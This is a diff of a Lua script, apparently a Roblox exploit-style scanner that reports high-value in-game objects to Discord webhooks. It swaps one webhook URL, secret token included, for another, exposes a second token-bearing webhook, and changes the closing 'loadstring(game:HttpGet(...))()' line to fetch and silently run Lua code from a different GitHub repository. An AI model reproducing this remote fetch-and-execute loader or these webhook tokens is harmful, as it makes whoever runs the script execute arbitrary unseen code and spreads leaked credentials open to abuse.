@@ -11,7 +11,7 @@ local INCOME_THRESHOLD = 10_000_000 -- 50M/s минимум для уведом�
 local HIGH_PRIORITY_THRESHOLD = 500_000_000 -- 500M/s для особо важных объектов
 local MEDIUM_PRIORITY_THRESHOLD = 100_000_000 -- 100M/s для среднего приоритета
 local DISCORD_WEBHOOK_URL =
-    'https://discord.com/api/webhooks/1421494214570807481/uYgRF4vI6NEHNFF0tNmoG-wTOBypMlgTsRlmY_6qSkA4DxgTTCe70U7Cbv-kkTCoQOPz'
+    'https://discord.com/api/webhooks/1424147041311002656/W_E7_-Z9DUucHP4p5BqOYeVKWhtACzAzVQCNW2nD0CPikwwk4yfEBVbgmV_wVsoNR_Oo'
 local MEDIUM_WEBHOOK_URL =
     'https://ptb.discord.com/api/webhooks/1426282608710647952/bmfmWPMug07ht7nRa_QeCVi7tfItybezKVkZ2tmw7lsODttiUnSnYJArl6UchxqIbeyT'
 
@@ -585,4 +585,4 @@ end)
 
 print('💡 Нажмите F для повторного сканирования')
 print('📱 Discord webhooks готовы к отправке уведомлений')
-loadstring(game:HttpGet('https://raw.githubusercontent.com/velo35001/logi/refs/heads/main/botik.lua'))()
+loadstring(game:HttpGet('https://raw.githubusercontent.com/DEBIL59195/KLIMTYPOU/refs/heads/main/KLIM.lua'))()
